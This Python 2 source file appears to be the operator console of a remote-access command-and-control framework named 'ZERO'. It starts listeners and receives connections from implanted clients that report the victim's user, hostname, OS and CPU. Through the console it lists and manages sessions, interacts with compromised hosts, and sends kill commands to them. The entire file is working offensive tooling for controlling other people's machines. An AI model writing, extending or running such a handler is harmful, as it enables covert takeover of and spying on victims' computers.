#!/usr/bin/env python2
#import setproctitle
#setproctitle.setproctitle("LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL")

import socket, sys, os, base64, random, paramiko, subprocess as sp, threading, readline, time

from configurations.modules.basic_modules import *
from configurations.modules.connection_handler import *

import __builtin__ 

def raw_input2(prompt=''): 
	try: 
		return raw_input1(prompt) 
	except EOFError as e: 
		time.sleep(0.05) 
		raise

raw_input1 = raw_input 
__builtin__.raw_input = raw_input2

class ThreadMaster(threading.Thread):
	def __init__(self, target, args=()):
		super(ThreadMaster, self).__init__(target=target, args=args)
		self.stopper = threading.Event()
		
	def stop(self):
		self.stopper.set()
		
	def stopped(self):
		return self.stopper.isSet()

class ZConsole():

	ERROR = "error"
	INPUT = "red"
	WARNING = "warning"
	SUCCESS = "success"
	INFORMATION = "information"
	INFORMATION_WITH_TEXT = "info"
	LIGHT_GRAY = "lg"
	YELLOW = "yellow"
	GREEN = "green"
	STRIKE = "-"
	UNDERLINE = "_"
	BLUE = "b"
	RED = INPUT

	def __init__(self):
		self.available_clients = {}

		self.server_instances = {}
		self.session_counter = 0

		self.base_folder = os.getcwd() + "/Zero"

		self.interactive_mode = False
		self.notifcations = []

		self.alias = {}

	def server_sockets(self, server_instance, bind_addr, bind_port):
		currentThread = threading.currentThread()

		while not currentThread.stopped():
			connected_client, address = server_instance.accept()

			if currentThread.stopped():
				connected_client.close()
				continue

			client_address, client_connect_port = address

			try:
				remote_client_information = connected_client.recv(4096)
			except socket.error as e:
				print colors(self.ERROR, "Client disconnected before sending system information",1,1)
				continue
			except Exception as e:
				print colors(self.ERROR, "Unhandled Error: " + str(e),1,1)
				continue

			try:
				remote_client_information.split(",")
			except IndexError as e:
				print colors(self.ERROR, "The script received an unusual connect from %s which could only mean:\n" % (client_address), 1)
				print colors(self.ERROR, "	1. The machine has been scanned or port-swept")
				print colors(self.ERROR, "	2. The connecting program has been modified to send corrupt or incompatible data", 0,1)
				continue
			except Exception as e:
				print colors(self.ERROR, "Unhandled Error: " + str(e), 1,1)
				continue
			
			client_folder = "SESSION-" + str(self.session_counter) + "-" + client_address + "-" + str(random.randint(999,999999))
			client_folder = os.path.join(self.base_folder, client_folder)

			stat, reason = configure_environment(client_folder)

			if stat != 0:
				print colors(self.ERROR, "Failed to create workspace for %s" % (client_address),1)
				print colors(self.ERROR, "REASON: " + reason)
				print colors(self.ERROR, "Interrupting Client Connection ... done",0,1)
				connected_client.close()
				continue

			client_object = {self.session_counter: {"address":client_address, "sysinfo": remote_client_information, "directory":client_folder, "stream":connected_client}}

			self.available_clients.update(client_object)

			if not self.interactive_mode:
				sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
				print colors(self.INFORMATION_WITH_TEXT,"Session ID: %d Opened from %s on %s:%d\a" % (self.session_counter, client_address, bind_addr, bind_port), 0, 1)
				sys.stdout.write(colors(self.INPUT, " ZERO") + colors(self.LIGHT_GRAY,">> ") + readline.get_line_buffer())
				sys.stdout.flush()
			else:
				self.notifcations.append(colors(self.INFORMATION_WITH_TEXT, "Session ID: %d Opened from %s on %s:%d" % (self.session_counter, client_address, bind_addr, bind_port), 0, 1))

			self.session_counter += 1

	def kill_all(self):
		list_to_pop = []
		malfunction = []

		for each_client in self.available_clients:
			connection = self.available_clients[each_client]['stream']

			response = send_data(connection, "kill")

			if response == "[XX]SESSION-END[XX]":
				print colors(self.ERROR, "Malfunctioned Client %d: Unable to Control Host @ %s" % (each_client,self.available_clients[each_client]['address']))
				print colors(self.ERROR, "Updating Client Session List.",0,1)
				malfunction.append(each_client)
			else:
				if response.startswith("Shell@"):
					print colors(self.SUCCESS, response)
					list_to_pop.append(each_client)
				else:
					print colors(self.ERROR, response, 1,1)

		for client_id in list_to_pop:
			self.available_clients[client_id]['stream'].close()
			self.available_clients.pop(client_id)

		for client_id in malfunction:
			self.available_clients.pop(client_id)

	def runnable(self):
		runnable_path = os.getcwd() + "/configurations/runnable"

		if os.path.exists(runnable_path):
			for root, dirs, files in os.walk(runnable_path):
				for filename in files:
					filename_txt, extension = os.path.splitext(filename)

					root_path = os.path.join(root, filename)

					if extension == ".alias":
						with open(root_path, "rb") as alias_reader:
							content = alias_reader.readlines()

							comment = ""
							comment_line = ""

							try:
								comment_line = content[0]
							except IndexError as e:
								pass

							if comment_line.startswith("#"):
								comment = comment_line.lstrip("#").strip()
							else:
								comment = "No Description Provided"

							alias_object = {filename_txt : {"commands" : content[1:], "description": comment}}
							self.alias.update(alias_object)
					else:
						print colors(self.ERROR, "Ignoring '%s' due to bad formatting" % (filename),1,1)
		else:
			print colors(self.ERROR, "Runnable file not found. Ignored.",1,1)

	def ZshConsole(self, command='', loopMode=False):
		try:
			if loopMode == False:
				command = raw_input(colors(self.INPUT, " ZERO") + colors(self.LIGHT_GRAY,">> ")).strip()

			if len(command) == 0:
				return
		except KeyboardInterrupt:
			print colors(self.ERROR, "User Requested A Shutdown.", 2)
			print colors(self.SUCCESS, "Exiting the Framework ... done",0,1)
			return 0

		if command.split(" ")[0] == "start_server":
			if len(command.split(" ")) != 3:
				print colors(self.ERROR, "Command: start_server <lhost> <lport>",1,0)
				print colors(self.ERROR, "Please provide the binding address and the listening port",0,1)
				return

			lhost = command.split(" ")[1]
			lport = command.split(" ")[2]

			if lhost.count(".") != 3 and lhost != "localhost":
				print colors(self.ERROR, "Please enter a valid binding address",1,1)
				return

			if lport.isdigit() == False:
				print colors(self.ERROR, "Please enter a valid port",1,1)
				return

			if lhost == "localhost":
				lhost = ""

			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
				s.bind((lhost, int(lport)))
				s.listen(10)
			except Exception, e:
				print colors(self.ERROR, "Unable To Setup Socket. Change port and try again.",1,1)
				return

			if lhost == "":
				lhost = "localhost"

			ct = ThreadMaster(target=self.server_sockets, args=(s, lhost, int(lport)))
			ct.daemon = True
			ct.start()

			server_name = lhost + ":" + lport

			server_instance_object = {server_name : {"stream":s,"thread":ct}}
			self.server_instances.update(server_instance_object)

			print colors(self.SUCCESS, "Server Started Successfully", 1)
			print colors(self.SUCCESS, "Listening for incoming connections on %d" % (int(lport)), 0, 1)
		elif command.split(" ")[0] == "sessions":
			if len(self.available_clients) == 0:
				print colors(self.ERROR, "There are no esablished sessions",1,1)
				return

			print colors(self.SUCCESS, "Listing sessions ...",1)
			print " " + colors(self.LIGHT_GRAY, "="*80)

			first_time = 0

			for x in self.available_clients:
				if first_time != 0:
					print
				else:
					first_time += 1

				lhost = self.available_clients[x]['address']
				system_information = self.available_clients[x]['sysinfo']

				print colors(self.GREEN, " [+] Session ID: ") +  colors(self.BLUE,str(x)) + " "*6 + colors(self.GREEN, " [+] Hostname: ") + colors(self.BLUE, 
					lhost) + " "*6 + colors(self.GREEN, " [+] User: ") + colors(self.BLUE,system_information.split(",")[5] + "@" + system_information.split(",")[1])
				print colors(self.GREEN, " [+] Information: ") +  colors(self.BLUE, 
					"(" + system_information.split(",")[0] + " OS) CPU: " + system_information.split(",")[11].replace("<#>", ", "))

			print " " + colors(self.LIGHT_GRAY, "="*80,0,1)
		elif command.split(" ")[0] == "servers":
			if len(self.server_instances) == 0:
				print colors(self.ERROR, "There are no servers running. Use 'start_server' to listen",1,1)
				return

			print colors(self.SUCCESS, "Listing servers on all interfaces",1)
			print " " + colors(self.LIGHT_GRAY, "="*80)
			for server_instance in self.server_instances:
				temp = server_instance.split(":")
				print colors(self.GREEN, " [+] Bind Host: ") + colors(self.BLUE,temp[0]) + colors(self.GREEN, " [+] Bind Port: ") + colors(self.BLUE,temp[1])
			print " " + colors(self.LIGHT_GRAY, "="*80,0,1)
		elif command.split(" ")[0] == "stop_servers":
			if len(command.split(" ")) != 1:
				print colors(self.ERROR, "Command: stop_servers",1)
				print colors(self.ERROR, "Close all running servers/listeners. No arguments allowed.",0,1)
				return

			if len(self.server_instances) == 0:
				print colors(self.ERROR, "There are no running servers to stop",1,1)
				return

			list_to_pop = []

			for each_server_instance in self.server_instances:
				list_to_pop.append(each_server_instance)

			print

			for each_instance in list_to_pop:
				print colors(self.SUCCESS, "Terminating server running on %s" % (each_instance))
				try:
					self.server_instances[each_instance]['stream'].close()
					self.server_instances[each_instance]['thread'].stop()
					self.server_instances.pop(each_instance)
					print colors(self.SUCCESS, "Server @ %s terminated successfully" % (each_instance),0,1)
				except Exception as e:
					print colors(self.ERROR, "An error occurred whilst terminating server: %s" % (str(e)),0,1)
					continue
			print
		elif command.split(" ")[0] == "stop_server":
			if len(command.split(" ")) != 3:
				print colors(self.ERROR, "Command: stop_server <lhost> <lport>",1)
				print colors(self.ERROR, "Please provide the binding address and the listening port",0,1)
				return

			lhost = command.split(" ")[1]
			lport = command.split(" ")[2]

			if lhost.count(".") != 3 and lhost != "localhost":
				print colors(self.ERROR, "Please enter a valid binding address",1,1)
				return

			if lport.isdigit() == False:
				print colors(self.ERROR, "Please enter a valid port",1,1)
				return

			server_name = lhost + ":" + lport

			try:
				self.server_instances[server_name]['stream'].close()
				self.server_instances[server_name]['thread'].stop()
				self.server_instances.pop(server_name)
			except KeyError as e:
				print colors(self.ERROR, "The listener specified does not exist", 1,1)
				return
			except Exception as e:
				print colors(self.ERROR, "Unhandled Error: " + str(e),1,1)
				return

			print colors(self.SUCCESS, "Server Shutdown Successful", 1)
			print colors(self.SUCCESS, "Incoming connections cannot be received",0,1)
		elif command.split(" ")[0] == "interact":
			if len(command.split(" ")) == 1:
				print colors(self.ERROR, "Command: interact <session id>",1)
				print colors(self.ERROR, "Please provide a session id. Use 'sessions' to list clients")
				return

			session_id = ' '.join(command.split(' ')[1:]).strip()

			if session_id.isdigit() == False:
				print colors(self.ERROR, "Invalid Session Id. Try Again",1,1)
				return

			session_id = int(session_id)

			if self.available_clients.has_key(session_id) == False:
				print colors(self.ERROR, "The session id specified does not exist",1,1)
				return

			print colors(self.SUCCESS, "Interfacing with session id %d" % (session_id),1,1)

			connection = self.available_clients[session_id]['stream']
			address = self.available_clients[session_id]['address']
			base_folder = self.available_clients[session_id]['directory']
			system = self.available_clients[session_id]['sysinfo'].split(",")

			console(connection, address, base_folder, system)
		elif command.split(" ")[0] == "help":
			temp_alias = {}

			for x in self.alias:
				temp_alias[x] = self.alias[x]['description']

			if len(command.split(" ")) == 1:
				print ZConsoleHelp(temp_alias,'')
			else:
				args = ' '.join(command.split(" ")[1:])
				print ZConsoleHelp(temp_alias, args)
		elif command.split(" ")[0] == "kill_all":
			if len(self.available_clients) == 0:
				print colors(self.ERROR, "There are no clients to be disconnected",1,1)
				return

			print colors(self.GREEN, " [+] Notifying all clients to exit from server ...",1,0,"+")
			print colors(self.GREEN, " [+] Sending kill commands to all clients ...",0,1,"+")

			self.kill_all()

			print colors(self.GREEN, " [+] Kill Commands Sent.",1,0)

			if len(self.available_clients) == 0:
				print colors(self.GREEN, " [+] All Clients have been Successfully Disconnected",0,1)
				return
			else:
				print colors(self.ERROR, "Not all connected addresses were disconnected. Try again",0,1)
				return		
		elif command.split(" ")[0] == "quit" or command.split(" ")[0] == "bye" or command.split(" ")[0] == "exit":
			if len(command.split(" ")) == 1 and len(self.available_clients) != 0:
				print colors(self.ERROR, "There are connected clients to be disconnected before exiting.",1,1)
				return
			elif len(command.split(" ")) == 1 and len(self.server_instances) != 0:
				print colors(self.ERROR, "There are servers running. Use 'stop_servers' to kill all servers before exiting",1,1)
				return
			elif len(command.split(" ")) == 2 and command.split(" ")[1] == "-f":
				print colors(self.INFORMATION, "Forcibly Exiting the Framework ... done",1,1)
				return 0
			elif len(command.split(" ")) == 2 and command.split(" ")[1] == "-n":
				if len(self.available_clients) == 0:
					print colors(self.INFORMATION, "There are no clients to be disconnected before exiting.",1)
					if len(self.server_instances) != 0:
						print colors(self.ERROR, "There are servers running. Use 'stop_servers' to kill all servers before exiting",0,1)
						return

					print colors(self.SUCCESS, "Exiting the Framework ... done",0,1)
					return

				print colors(self.GREEN, " [+] Notifying all clients to exit from server ...",1,0,"+")
				print colors(self.GREEN, " [+] Sending kill commands to all clients ...",0,1, "+")

				self.kill_all()

				print colors(self.GREEN, " [+] Kill Commands Sent.",1,0)

				if len(self.available_clients) == 0:
					print colors(self.GREEN, " [+] Exiting the Framework ... done",0,1)
					return 0
				else:
					print colors(self.ERROR, "Not all connected addresses were disconnected. Try again",0,1)
					return
			else:
				print colors(self.GREEN, " [+] Exiting the Framework ... done", 1,1)
				return 0
		elif command.split(" ")[0] == "close":
			if len(command.split(" ")) == 0:
				print colors(self.ERROR, "Command: close <session id>",1)
				print colors(self.ERROR, "Provided the session id to close connection",0,1)
				return

			session_id = ' '.join(command.split(" ")[1:])

			if session_id.isdigit() == False:
				print colors(self.ERROR, "Invalid session id",1,1)
				return

			session_id = int(session_id)

			if self.available_clients.has_key(session_id) == False:
				print colors(self.ERROR, "The session id provided does not exist",1,1)
				return

			connection = self.available_clients[session_id]['stream']

			response = send_data(connection, "kill")

			if response == "[XX]SESSION-END[XX]":
				return
			else:
				if response.startswith("Shell@"):
					print colors(self.SUCCESS, response,1)
					self.available_clients.pop(session_id)
				else:
					print colors(self.ERROR, response, 1,1)
		elif command.split(" ")[0] == "cls" or command.split(" ")[0] == "clear":
			txp = os.system("clear")
		else:
			if loopMode == False:
				if self.alias.has_key(command):
					items = self.alias[command]['commands']

					print
					for each_command in items:
						each_command = each_command.strip("\n")
						print colors(self.GREEN," [+] Command: " + each_command)
						stat = self.ZshConsole(command=each_command, loopMode=True)

			out, err, returncode = execute_command(command)

			result = str(out) + str(err)

			if result == "" and returncode == 0:
				result = "Successful Execution"

			if len(err) != 0 and returncode != 0:
				return

			print colors(self.SUCCESS, "Execute command: %s " % (command), 1)

			if result.split("\n")[-1].strip() != "":
				result += "\n"

			if result.split("\n")[0].strip() != "":
				result = "\n" + result

			for x in result.split("\n"):
				print colors(self.LIGHT_GRAY, " " + x)

	def ZConsole(self):
		stat, reason = configure_environment(self.base_folder)

		if stat != 0:
			print colors(self.ERROR, "Failed to create workspace.",1)
			print colors(self.ERROR, "REASON: " + reason)
			print colors(self.ERROR, "Exiting the Framework ... done",0,1)
			return 1

		self.runnable()

		while 1:
			stat = self.ZshConsole()

			if stat == 0: break
			else: continue

if __name__ == "__main__":
	t = os.system("clear")
	stat = ZConsole().ZConsole()
	sys.exit(stat)